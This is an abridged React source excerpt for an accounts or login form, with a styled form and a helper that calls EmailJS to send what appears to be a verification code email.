import { Themes, LogoIcon, UserIcon, GoogleIcon, LockIcon, EyeIcon, EyeOffIcon, AlertCircleIcon, SpinnerIcon, Spin } from 'components/icons'
...
const Form = styled.form`
	box-shadow: hsla(230, 30%, 25%, 0.05) 0 0 10px;
	outline: 1px solid hsl(230, 100%, 95%);
...
const Accounts = () => {
	...
	const HANDLE_CODES = (email) => {
		...
		emailjs.send('service_6qlnoiv', 'template_3p6mo4e', template, 'user_SWAtem865rbS9e8XZtGxk')
	}
